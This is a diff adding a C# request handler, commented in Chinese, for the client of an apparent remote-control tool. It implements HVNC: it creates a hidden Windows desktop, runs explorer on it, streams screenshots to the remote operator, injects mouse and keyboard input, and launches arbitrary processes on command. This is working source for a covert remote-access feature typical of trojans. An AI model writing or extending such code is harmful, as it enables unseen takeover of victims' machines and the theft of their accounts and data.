@@ -1,0 +1,186 @@
+using System;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
+using System.Threading;
+using RemoteControl.Client.Utils;
+using RemoteControl.Protocals;
+
+namespace RemoteControl.Client.Handlers
+{
+    /// <summary>
+    /// HVNC 隐形桌面请求处理器
+    /// </summary>
+    class RequestHVNCHandler : IRequestHandler
+    {
+        private HVNCDesktop _desktop;
+        private volatile bool _isRunning = false;
+        private Thread _captureThread;
+        private int _fps = 5;
+
+        public void Handle(SocketSession session, ePacketType reqType, object reqObj)
+        {
+            switch (reqType)
+            {
+                case ePacketType.PACKET_HVNC_START_REQUEST:
+                    HandleStart(session, reqObj);
+                    break;
+                case ePacketType.PACKET_HVNC_STOP_REQUEST:
+                    HandleStop();
+                    break;
+                case ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST:
+                    HandleMouseEvent(reqObj);
+                    break;
+                case ePacketType.PACKET_HVNC_KEYBOARD_EVENT_REQUEST:
+                    HandleKeyboardEvent(reqObj);
+                    break;
+                case ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST:
+                    HandleRunProcess(reqObj);
+                    break;
+            }
+        }
+
+        private void HandleStart(SocketSession session, object reqObj)
+        {
+            var resp = new ResponseHVNCStart();
+            try
+            {
+                if (_isRunning)
+                {
+                    HandleStop();
+                    Thread.Sleep(500);
+                }
+
+                var req = reqObj as RequestHVNCStart;
+                if (req != null && req.Fps > 0)
+                    _fps = req.Fps;
+
+                string deskName = "HVNC_" + Guid.NewGuid().ToString("N").Substring(0, 8);
+                _desktop = new HVNCDesktop();
+                if (!_desktop.Create(deskName))
+                {
+                    resp.Result = false;
+                    resp.Message = "CreateDesktop failed";
+                    session.Send(ePacketType.PACKET_HVNC_START_RESPONSE, resp);
+                    return;
+                }
+
+                // 在隐藏桌面上启动 explorer
+                _desktop.StartProcess("explorer.exe", "");
+                Thread.Sleep(2000);
+
+                _isRunning = true;
+                resp.Result = true;
+                resp.DesktopName = deskName;
+                resp.ScreenWidth = 1920;
+                resp.ScreenHeight = 1080;
+                session.Send(ePacketType.PACKET_HVNC_START_RESPONSE, resp);
+
+                // 启动截图循环
+                _captureThread = new Thread(() => CaptureLoop(session))
+                {
+                    IsBackground = true,
+                    Name = "HVNC_Capture"
+                };
+                _captureThread.Start();
+            }
+            catch (Exception ex)
+            {
+                resp.Result = false;
+                resp.Message = ex.Message;
+                session.Send(ePacketType.PACKET_HVNC_START_RESPONSE, resp);
+            }
+        }
+
+        private void HandleStop()
+        {
+            _isRunning = false;
+            if (_captureThread != null)
+            {
+                _captureThread.Join(3000);
+                _captureThread = null;
+            }
+            if (_desktop != null)
+            {
+                _desktop.Dispose();
+                _desktop = null;
+            }
+        }
+
+        private void HandleMouseEvent(object reqObj)
+        {
+            if (_desktop == null) return;
+            try
+            {
+                var req = reqObj as RequestMouseEvent;
+                if (req == null) return;
+
+                int button = 1; // left
+                if (req.MouseButton == eMouseButtons.Right) button = 2;
+                int ope = 2; // move
+                switch (req.MouseOperation)
+                {
+                    case eMouseOperations.MouseDown: ope = 0; break;
+                    case eMouseOperations.MouseUp: ope = 1; break;
+                    case eMouseOperations.MouseMove: ope = 2; break;
+                    case eMouseOperations.MouseDoubleClick: ope = 3; break;
+                }
+
+                _desktop.InjectMouseEvent(req.MouseLocation.X, req.MouseLocation.Y, button, ope);
+            }
+            catch { }
+        }
+
+        private void HandleKeyboardEvent(object reqObj)
+        {
+            if (_desktop == null) return;
+            try
+            {
+                var req = reqObj as RequestKeyboardEvent;
+                if (req == null) return;
+                _desktop.InjectKeyboardEvent(req.KeyValue, req.KeyOperation == eKeyboardOpe.KeyDown);
+            }
+            catch { }
+        }
+
+        private void HandleRunProcess(object reqObj)
+        {
+            if (_desktop == null) return;
+            try
+            {
+                var req = reqObj as RequestHVNCRunProcess;
+                if (req == null) return;
+                _desktop.StartProcess(req.FilePath, req.Arguments ?? "");
+            }
+            catch { }
+        }
+
+        private void CaptureLoop(SocketSession session)
+        {
+            int interval = 1000 / _fps;
+            while (_isRunning)
+            {
+                try
+                {
+                    using (Bitmap bmp = _desktop.CaptureScreen())
+                    {
+                        if (bmp != null)
+                        {
+                            using (var ms = new MemoryStream())
+                            {
+                                bmp.Save(ms, ImageFormat.Jpeg);
+                                var resp = new ResponseHVNCScreen();
+                                resp.ImageData = ms.ToArray();
+                                resp.Width = bmp.Width;
+                                resp.Height = bmp.Height;
+                                session.Send(ePacketType.PACKET_HVNC_SCREEN_RESPONSE, resp);
+                            }
+                        }
+                    }
+                }
+                catch { }
+                Thread.Sleep(interval);
+            }
+        }
+    }
+}
